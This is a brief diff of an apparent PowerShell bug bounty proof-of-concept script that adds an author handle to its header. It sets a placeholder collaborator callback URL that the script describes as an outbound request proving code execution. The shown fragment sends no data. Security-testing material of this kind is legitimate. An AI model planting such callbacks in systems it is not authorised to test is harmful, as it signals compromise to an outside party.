@@ -1,4 +1,4 @@
-# Harmless Bug Bounty PoC
+# Harmless Bug Bounty PoC by @bughuntar
 # Makes a simple outbound request to prove code execution
 
 $CallbackUrl = "https://your-collaborator-domain.com/poc-test"
